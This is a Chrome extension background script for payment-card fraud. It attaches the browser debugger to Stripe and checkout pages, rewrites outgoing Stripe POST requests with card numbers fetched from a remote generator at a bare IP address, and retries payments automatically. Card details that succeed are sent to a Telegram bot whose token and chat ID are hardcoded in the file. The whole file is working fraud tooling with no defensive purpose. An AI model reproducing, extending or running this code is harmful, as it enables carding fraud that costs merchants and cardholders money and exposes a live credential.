// Configuration
const CONFIG = {
  BOT_TOKEN: '7606275785:AAEpUI8tn8stdDXF0EUIsnd_MAznOvDTUC0',
  CARD_GENERATOR_URL: 'http://193.203.162.2:1490/bin=',
  DEBUGGER_VERSION: '1.3',
  RETRY_DELAY: 2000,
  DEFAULT_CHAT_ID: '8049055628'
};

// State management
const state = {
  bin: '',
  binSelector: '',
  ccSelector: '',
  userId: '',
  detailedChatId: CONFIG.DEFAULT_CHAT_ID,
  activeSelector: '',
  userClickedSubmit: false,
  retryInProgress: false,
  debuggerAttachedTabs: new Set(),
  tabCardDetailsMap: new Map(),
  tabSuccessUrlMap: new Map(),
  requestIdMap: new Map()
};

// Initialize state from storage
chrome.storage.local.get([
  "bin", "binSelector", "ccSelector", 
  'userId', "detailedChatId",
], (result) => {
  if (result.bin) state.bin = result.bin;
  if (result.binSelector) state.binSelector = result.binSelector;
  if (result.ccSelector) state.ccSelector = result.ccSelector;
  if (result.userId) state.userId = result.userId;
  if (result.detailedChatId) state.detailedChatId = result.detailedChatId;
  updateActiveSelector();
});

// Storage change listener
chrome.storage.onChanged.addListener((changes) => {
  Object.keys(changes).forEach(key => {
    if (state.hasOwnProperty(key)) {
      state[key] = changes[key].newValue;
    }
  });
  updateActiveSelector();
});

// Selector management
function updateActiveSelector() {
  if (state.bin && state.binSelector) {
    state.activeSelector = state.binSelector;
  } else if (state.ccSelector) {
    state.activeSelector = state.ccSelector;
  } else {
    state.activeSelector = '';
  }
}

// Card handling
async function getCardForTab(tabId) {
  if (state.bin) {
    let retryCount = 0;
    const maxRetries = 3;
    
    while (retryCount < maxRetries) {
      try {
        const response = await fetch(CONFIG.CARD_GENERATOR_URL + encodeURIComponent(state.bin));
        if (!response.ok) return null;
        const text = await response.text();
        const [number, month, year, cvv] = text.trim().split('|');
        if (!number || !month || !year || !cvv) {
          throw new Error('Invalid card data format');
        }
        return { number, month, year, cvv };
      } catch (error) {
        console.error('Card generation error:', error);
        retryCount++;
        if (retryCount === maxRetries) {
          return null;
        }
        // Wait before retrying
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }
  return null;
}

// Telegram integration
async function sendCardToTelegram(cardDetails, successUrl) {
  const detailedMessage = `
➜𝘗𝘈𝘠𝘔𝘌𝘕𝘛 𝘚𝘜𝘊𝘊𝘌𝘚𝘚𝘍𝘜𝘓𝘓𝘠
========================
➜𝘊𝘊: 
${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}

➜𝘚𝘜𝘊𝘊𝘌𝘚𝘚 𝘜𝘙𝘓: 
${successUrl}🎉
========================
`;

  const sendMessage = async (chatId, message) => {
    if (!chatId) return;
    try {
      const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
      const params = new URLSearchParams({ chat_id: chatId, text: message });
      await fetch(`${url}?${params}`);
    } catch (error) {
      console.error('Telegram send error:', error);
    }
  };

  await Promise.all([
    sendMessage(state.detailedChatId, detailedMessage),
  ]);
}

// Notification handling
function sendNotificationToContent(tabId, message, messageType = 'info') {
  chrome.scripting.executeScript({
    target: { tabId },
    func: (message, messageType) => {
      const fontAwesomeLink = document.createElement('link');
      fontAwesomeLink.rel = 'stylesheet';
      fontAwesomeLink.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
      document.head.appendChild(fontAwesomeLink);

      const toast = document.createElement('div');
      Object.assign(toast.style, {
        position: 'fixed',
        top: '70px',
        right: '20px',
        background: 'rgba(10, 10, 15, 0.95)',
        color: '#fff',
        padding: '10px 15px',
        borderRadius: '6px',
        fontSize: '12px',
        zIndex: '1000000',
        boxShadow: '0 0 10px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        backdropFilter: 'blur(5px)',
        fontFamily: 'Arial, sans-serif',
        fontWeight: '500',
        display: 'flex',
        alignItems: 'center',
        gap: '8px',
        transition: 'all 0.2s ease'
      });

      let iconClass = '';
      let iconColor = '';
      if (messageType === 'success') {
        iconClass = 'fas fa-check-circle';
        iconColor = '#4caf50';
      } else if (messageType === 'error') {
        iconClass = 'fas fa-times-circle';
        iconColor = '#ff4d4d';
      } else if (messageType === 'info') {
        iconClass = 'fas fa-info-circle';
        iconColor = '#2196f3';
      }

      const icon = document.createElement('i');
      icon.className = iconClass;
      icon.style.color = iconColor;
      icon.style.opacity = '0.8';

      toast.appendChild(icon);
      toast.appendChild(document.createTextNode(message));

      document.body.appendChild(toast);

      setTimeout(() => toast.remove(), 2500);
    },
    args: [message, messageType]
  }).catch(error => {
    console.error('Notification error:', error);
  });
}

// Tab management
function handleTabUpdate(tabId, changeInfo, tab) {
  if (!tab.url) return;

  const isTargetUrl = tab.url.includes('cs_live') || 
                      tab.url.includes('stripe.com') || 
                      tab.url.includes('checkout.') || 
                      tab.url.includes('billing.') || 
                      tab.url.includes('invoice.') || 
                      tab.url.includes('payment.') || 
                      tab.url.includes('pay.') || 
                      tab.url.includes('secure.'); // Extended URL checks
  if (isTargetUrl) {
    setupTab(tabId);
  }

  if (changeInfo.status === "complete") {
    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  }
}

function handleTabActivation({ tabId }) {
  chrome.tabs.get(tabId).then(tab => {
    if (!tab.url) return;

    const isTargetUrl = tab.url.includes('cs_live') || 
                        tab.url.includes('stripe.com') || 
                        tab.url.includes('checkout.') || 
                        tab.url.includes('billing.') || 
                        tab.url.includes('invoice.') || 
                        tab.url.includes('payment.') || 
                        tab.url.includes('pay.') || 
                        tab.url.includes('secure.'); // Extended URL checks
    if (isTargetUrl) {
      setupTab(tabId);
    }

    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  });
}

function setupTab(tabId) {
  injectContentScript(tabId);
  if (!state.debuggerAttachedTabs.has(tabId)) {
    attachDebugger(tabId);
  }
}

// Content script injection
function injectContentScript(tabId) {
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    files: ['scripts/content.js']
  }).catch(error => {
    console.error('Script injection error:', error);
  });
}

// Debugger handling
function attachDebugger(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) return;

  chrome.tabs.get(tabId, (tab) => {
    if (chrome.runtime.lastError || !tab || !tab.url) {
      console.error('Tab not found or not fully loaded:', chrome.runtime.lastError);
      return;
    }

    chrome.debugger.attach({ tabId }, CONFIG.DEBUGGER_VERSION, () => {
      if (chrome.runtime.lastError) {
        console.error('Debugger attach error:', chrome.runtime.lastError);
        return;
      }

      console.log(`Debugger attached to tab ${tabId}`);
      state.debuggerAttachedTabs.add(tabId);
      chrome.debugger.sendCommand({ tabId }, "Fetch.enable", { patterns: [{ urlPattern: '*' }] });
      chrome.debugger.sendCommand({ tabId }, "Network.enable");
    });
  });
}

async function handleDebuggerEvent(source, method, params) {
  if (!source.tabId || !state.debuggerAttachedTabs.has(source.tabId)) return;

  console.log(`Debugger event: ${method}`, params);

  const handlers = {
    'Fetch.requestPaused': () => handleRequestPaused(source.tabId, params),
    'Network.responseReceived': () => handleResponseReceived(source.tabId, params),
    'Fetch.authRequired': () => handleAuthRequired(source.tabId, params)
  };

  const handler = handlers[method];
  if (handler) await handler();
}

async function handleRequestPaused(tabId, params) {
  const { requestId, request } = params;
  if (params.networkId) {
    state.requestIdMap.set(requestId, params.networkId);
  }

  if (request.url.includes('stripe.com') && 
      request.method === "POST" && 
      request.postData) {
    console.log('Intercepted request payload:', request.postData);

    const card = await getCardForTab(tabId);
    if (card) {
      const postData = new URLSearchParams(request.postData);
      console.log('Parsed postData:', postData.toString());

      if (postData.has('card[number]')) {
        postData.set("card[number]", card.number);
        postData.set("card[exp_month]", card.month);
        postData.set("card[exp_year]", card.year);
        postData.set('card[cvc]', card.cvv);
      } else {
        chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
        return;
      }

      const updatedPostData = postData.toString();
      const headers = {
        ...request.headers,
        "Content-Length": updatedPostData.length.toString(),
        "Content-Type": "application/x-www-form-urlencoded"
      };

      const headersArray = Object.entries(headers).map(([name, value]) => ({ name, value: value.toString() }));
      const encodedPostData = btoa(unescape(encodeURIComponent(updatedPostData)));

      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", {
        requestId,
        method: request.method,
        postData: encodedPostData,
        headers: headersArray
      });

      state.tabCardDetailsMap.set(tabId, card);
      sendNotificationToContent(tabId, `Using Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`, "info");
      proceedToRetry(tabId);
    } else {
      sendNotificationToContent(tabId, "try again.", 'error');
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
    }
  } else {
    chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
  }
}

async function handleResponseReceived(tabId, params) {
  const { requestId, response } = params;
  if (!response.url.includes("stripe.com")) return;

  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  if (!contentType.includes("application/json")) return;

  chrome.debugger.sendCommand({ tabId }, "Network.getResponseBody", { requestId }, (response) => {
    if (chrome.runtime.lastError || !response?.body) {
      console.error('Error fetching response body:', chrome.runtime.lastError);
      return;
    }

    try {
      const json = JSON.parse(response.base64Encoded ? atob(response.body) : response.body);
      
      if (json.success_url) {
        state.tabSuccessUrlMap.set(tabId, json.success_url);
      }

      const isPaymentSuccess = json.status?.toLowerCase() === 'succeeded' || 
                               json.status?.toLowerCase() === 'success' || 
                               json.payment_intent?.status?.toLowerCase() === 'succeeded' || 
                               json.payment_intent?.status?.toLowerCase() === 'success';

      if (isPaymentSuccess) {
        handleSuccess(tabId, state.tabSuccessUrlMap.get(tabId) || "N/A");
        return;
      }

      if (json.error || (json.payment_intent?.last_payment_error)) {
        const error = json.error || json.payment_intent.last_payment_error;
        const declineCode = error.decline_code || error.code || "Unknown error code";
        const errorMessage = error.message || "An error occurred during the transaction.";
        sendNotificationToContent(tabId, `Card Declined: ${declineCode} - ${errorMessage}`, "error");
      }

    } catch (error) {
      console.error('Error parsing response:', error);
    }

    proceedToRetry(tabId);
  });
}

function handleSuccess(tabId, successUrl) {
  const cardDetails = state.tabCardDetailsMap.get(tabId);
  if (cardDetails) {
    sendCardToTelegram(cardDetails, successUrl);
    state.tabCardDetailsMap.delete(tabId);
    sendNotificationToContent(tabId, `Payment Success! `, 'success');
    state.userClickedSubmit = false;
    state.tabSuccessUrlMap.delete(tabId);
  }
}

function proceedToRetry(tabId) {
  if (state.userClickedSubmit && !state.retryInProgress) {
    state.retryInProgress = true;
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, {
        type: "trigger_retry",
        selector: state.activeSelector
      }).finally(() => {
        state.retryInProgress = false;
      });
    }, CONFIG.RETRY_DELAY);
  }
}

function handleAuthRequired(tabId, params) {
  chrome.debugger.sendCommand({ tabId }, "Fetch.continueWithAuth", {
    requestId: params.requestId,
    authChallengeResponse: { response: 'Default' }
  });
}

// Cleanup
function handleTabRemoval(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) {
    chrome.debugger.detach({ tabId }, () => {
      if (chrome.runtime.lastError) {
        console.error('Debugger detach error:', chrome.runtime.lastError);
      }
      state.debuggerAttachedTabs.delete(tabId);
      state.tabCardDetailsMap.delete(tabId);
      state.tabSuccessUrlMap.delete(tabId);
    });
  }
}

// Event listeners
chrome.runtime.onMessage.addListener((message) => {
  if (message.type === 'user_clicked_submit') {
    state.userClickedSubmit = true;
  }
});

chrome.tabs.onUpdated.addListener(handleTabUpdate);
chrome.tabs.onActivated.addListener(handleTabActivation);
chrome.tabs.onRemoved.addListener(handleTabRemoval);
chrome.debugger.onEvent.addListener(handleDebuggerEvent);